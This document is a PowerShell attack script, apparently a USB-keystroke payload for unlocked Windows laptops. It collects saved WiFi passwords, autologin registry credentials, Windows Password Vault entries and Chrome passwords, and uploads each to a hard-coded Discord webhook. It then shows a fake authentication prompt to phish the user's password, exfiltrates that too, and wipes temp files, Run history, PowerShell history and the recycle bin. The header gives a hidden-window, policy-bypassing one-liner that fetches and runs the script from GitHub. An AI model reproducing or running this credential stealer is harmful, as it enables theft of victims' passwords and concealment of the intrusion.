# Used to automate some fun stuff with an unlocked laptop.
# Tested on Windows 10 & Windows 11

# Some Globals
# The Discord sending webhook
# Example use: powershell -w h -ep bypass $discordwebhook='https://discord.com/whatever';irm https://raw.githubusercontent.com/NotAMaliciousHacker/MaliciousFlipperScripts/main/AllTheFun/AllTheFun.ps1 | iex
$discordwebhook = "https://discord.com/api/webhooks/1096430664611532840/lVlGIudSqtFV8JjN4XDBZu77c19uEPM1VS5tVVPRnifRR5NY88yT72R7J-Qv7l9Lv-Rc"
function Send-DiscordWebhook {
    param (
        [string]$WebhookUrl,
        [string]$Source,
        [string]$File
    )

    if(-not ([string]::IsNullOrEmpty($File))) {
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $fileName = [System.IO.Path]::GetFileName($File)
        $fileContent = [System.IO.File]::ReadAllBytes($File)
        $encodedFileContent = [System.Convert]::ToBase64String($fileContent)

        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file0`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream$LF",
            $encodedFileContent,
            "--$boundary--$LF"
        ) -join $LF

        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)

        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $bodyBytes
    }
}

# First, grab all the WiFi Password
$FileNameWifi = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFiPasswords.txt"
$FilePathWifi = $env:TEMP + "\" + $FileNameWifi
$wifiprofiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
$wifiprofiles > $env:TMP\$FileNameWifi 
Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Wifi" -File $FilePathWifi

# Autologin password
$FileNameAutoLogin = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_AutoLogin.txt"
$FilePathAutoLogin = $env:TEMP + "\" + $FileNameAutoLogin
echo Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword" > $env:TMP\$FileNameAutoLogin
If (($AutoLoginPassword).DefaultPassword) {
    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "AutoLogin" -File $FilePathAutoLogin
} 

# Windows Password Vault

$FileNameVault = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_PassVault.txt"
$FilePathVault = $env:TEMP + "\" + $FileNameVault
echo [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } > $env:TMP\$FileNameVault
Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Vault" -File $FilePathVault

# Chrome Password
$FileNameChrome = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_ChromePasswords.txt"
$FilePathChrome = $env:TEMP + "\" + $FileNameChrome
echo [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)) > $env:TMP\$FileNameChrome
Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "ChromeVault" -File $FilePathChrome

# Now that we send everything, do a nice prompt to the user to submit their password anyway :)
 
function Get-Creds {

    $form = $null

    while ($form -eq $null)
    {
        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
        $cred.getnetworkcredential().password

        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
        {
            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
            {
                Add-Type -AssemblyName PresentationCore,PresentationFramework
            }

            $msgBody = "Credentials cannot be empty!"
            $msgTitle = "Error"
            $msgButton = 'Ok'
            $msgImage = 'Stop'
            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
            Write-Host "The user clicked: $Result"
            $form = $null
        }
        
        else{
            $creds = $cred.GetNetworkCredential() | Format-List
            return $creds
        }
    }
}

function PauseScript {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell
    
        while (1) {
            $pauseTime = 3
            if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
                break
            }
            else {
                $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
            }
        }
    }
    
function CapsOff {
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
    
    #If true, toggle CapsLock key, to ensure that the script doesn't fail
    if ($caps -eq $true){
    
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
    }
}

PauseScript

CapsOff

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked!: $Result"

$FileNameCreds = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$FilePathCreds = $env:TEMP + "\" + $FileNameCreds
$creds = Get-Creds
echo $creds >> $FilePathCreds
Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "PasswordPrompt" -File $FilePathCreds

# Clear Evidence

Remove-Item -Path $env:TMP\* -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue



